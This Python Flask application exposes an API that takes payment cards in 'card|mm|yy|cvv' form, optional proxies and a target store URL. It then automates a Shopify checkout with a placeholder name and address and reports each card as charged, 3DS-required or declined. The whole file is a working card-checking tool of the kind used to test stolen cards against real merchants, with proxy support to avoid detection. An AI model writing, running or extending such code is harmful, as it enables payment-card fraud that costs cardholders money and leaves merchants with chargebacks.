from flask import Flask, request, jsonify
import requests
import json
import logging
import re
import time
from datetime import datetime
import os

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# =============== CONFIG ===============
REQUEST_TIMEOUT = 20          # seconds for each HTTP request
MAX_RETRIES = 2               # retry if we get a temporary error

# =============== HELPERS ===============
def extract_cc(text):
    """Extract card, month, year, cvv from format: card|mm|yy|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, month, year, cvv = match.groups()
        if len(year) == 2:
            year = '20' + year
        return card, month, year, cvv
    return None, None, None, None

def get_proxy_dict(proxy_str):
    """Convert proxy string to requests proxy dict."""
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts
        return {
            'http': f'http://{user}:{password}@{ip}:{port}',
            'https': f'https://{user}:{password}@{ip}:{port}'
        }
    elif len(parts) == 2:
        ip, port = parts
        return {
            'http': f'http://{ip}:{port}',
            'https': f'https://{ip}:{port}'
        }
    return None

def get_random_product_id(site, session, proxy_dict):
    """Fetch a product ID from the store's product list."""
    try:
        url = f"{site}/products.json?limit=1"
        resp = session.get(url, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('products'):
                return data['products'][0]['id']
    except:
        pass
    return None

def add_to_cart(site, session, product_id, quantity=1, proxy_dict=None):
    """Add a product to the cart."""
    try:
        url = f"{site}/cart/add.js"
        payload = {'id': product_id, 'quantity': quantity}
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        resp = session.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
        return resp.status_code == 200
    except:
        return False

def get_checkout_url(site, session, proxy_dict):
    """Get the checkout URL after adding to cart."""
    try:
        # Sometimes the cart.js gives the checkout URL directly
        url = f"{site}/cart.js"
        resp = session.get(url, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('items'):
                # Some stores have a direct checkout link
                return f"{site}/checkout"
        # Fallback: just return the checkout endpoint
        return f"{site}/checkout"
    except:
        return f"{site}/checkout"

def get_authenticity_token(session, checkout_url, proxy_dict):
    """Extract authenticity token from checkout page."""
    try:
        resp = session.get(checkout_url, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            html = resp.text
            token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
            if token_match:
                return token_match.group(1)
            # Also try to find token in URL
            token_match2 = re.search(r'/checkout/([a-zA-Z0-9]+)', resp.url)
            if token_match2:
                return token_match2.group(1)
    except:
        pass
    return None

def submit_payment(site, session, card, month, year, cvv, authenticity_token, proxy_dict):
    """Submit payment details to checkout."""
    # Build the checkout URL with token if we have it
    if authenticity_token and len(authenticity_token) > 10:
        # If token is a checkout token (alphanumeric)
        checkout_url = f"{site}/checkout/{authenticity_token}/payment"
    else:
        checkout_url = f"{site}/checkout/payment"

    # Basic payment data – some fields are required
    payload = {
        'authenticity_token': authenticity_token or '',
        'checkout[credit_card][number]': card,
        'checkout[credit_card][month]': month,
        'checkout[credit_card][year]': year,
        'checkout[credit_card][verification_value]': cvv,
        'checkout[payment_gateway]': 'shopify_payments',
        'checkout[accepts_terms]': '1',
        'checkout[shipping_address][first_name]': 'John',
        'checkout[shipping_address][last_name]': 'Doe',
        'checkout[shipping_address][address1]': '123 Main St',
        'checkout[shipping_address][city]': 'New York',
        'checkout[shipping_address][province]': 'NY',
        'checkout[shipping_address][zip]': '10001',
        'checkout[shipping_address][country]': 'US',
        'checkout[shipping_address][phone]': '1234567890',
        'checkout[email]': 'test@example.com',
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': f"{site}/checkout"
    }

    try:
        resp = session.post(checkout_url, data=payload, headers=headers, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            html = resp.text
            # Check for success indicators
            if 'order placed' in html.lower() or 'thank you' in html.lower():
                price_match = re.search(r'total_price["\']?\s*[:=]\s*["\']?([\d.]+)', html)
                price = float(price_match.group(1)) if price_match else 0.0
                return {"status": "charged", "message": "Order placed successfully", "price": price}
            elif '3ds' in html.lower() or '3d secure' in html.lower():
                return {"status": "3ds", "message": "3DS_REQUIRED", "price": 0.0}
            else:
                # Try to get error message
                error_match = re.search(r'<p class="error">(.*?)</p>', html, re.DOTALL)
                if error_match:
                    return {"status": "declined", "message": error_match.group(1).strip(), "price": 0.0}
                return {"status": "declined", "message": "Payment failed – unknown error", "price": 0.0}
        else:
            return {"status": "error", "message": f"HTTP {resp.status_code}", "price": 0.0}
    except Exception as e:
        return {"status": "error", "message": str(e), "price": 0.0}

# =============== MAIN CHECKOUT FUNCTION ===============
def checkout_shopify(site, card, month, year, cvv, proxy=None):
    """
    Complete Shopify checkout flow.
    Returns dict with Response, Price, Gateway.
    """
    session = requests.Session()
    proxy_dict = get_proxy_dict(proxy) if proxy else None

    # 1. Get product ID
    product_id = get_random_product_id(site, session, proxy_dict)
    if not product_id:
        # Fallback: try to get from cart (if already in cart) – but we don't have, so try a default product ID
        # Many stores have a product with ID 1 or 2
        product_id = 1
        # Last resort: fetch from products
        try:
            resp = session.get(f"{site}/products.json?limit=1", proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('products'):
                    product_id = data['products'][0]['id']
        except:
            pass

    if not product_id:
        return {"Response": "Could not find any product", "Price": 0, "Gateway": "Shopify Payments"}

    # 2. Add to cart
    if not add_to_cart(site, session, product_id, 1, proxy_dict):
        return {"Response": "Failed to add product to cart", "Price": 0, "Gateway": "Shopify Payments"}

    # 3. Get checkout URL and authenticity token
    checkout_url = get_checkout_url(site, session, proxy_dict)
    token = get_authenticity_token(session, checkout_url, proxy_dict)

    # 4. Submit payment
    result = submit_payment(site, session, card, month, year, cvv, token, proxy_dict)

    # Map result to expected format
    if result['status'] == 'charged':
        return {"Response": result['message'], "Price": result['price'], "Gateway": "Shopify Payments"}
    elif result['status'] == '3ds':
        return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify Payments"}
    elif result['status'] == 'declined':
        return {"Response": result['message'], "Price": 0, "Gateway": "Shopify Payments"}
    else:
        return {"Response": f"ERROR: {result['message']}", "Price": 0, "Gateway": "Shopify Payments"}

# =============== API ENDPOINT ===============
@app.route('/shopify', methods=['GET'])
def shopify_check():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not site or not cc:
        return jsonify({
            "Response": "Missing site or cc parameters",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }), 400

    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({
            "Response": "Invalid card format. Use: card|mm|yy|cvv",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }), 400

    if not site.startswith('http'):
        site = 'https://' + site

    try:
        result = checkout_shopify(site, card, month, year, cvv, proxy)
        # Ensure required keys
        result.setdefault('Response', 'Unknown')
        result.setdefault('Price', 0.0)
        result.setdefault('Gateway', 'Shopify Payments')
        return jsonify(result)
    except Exception as e:
        app.logger.error(f"Checkout error: {e}")
        return jsonify({
            "Response": f"ERROR: {str(e)}",
            "Price": 0,
            "Gateway": "Shopify Payments"
        }), 500

# =============== HEALTH CHECK ===============
@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

# =============== RUN ===============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
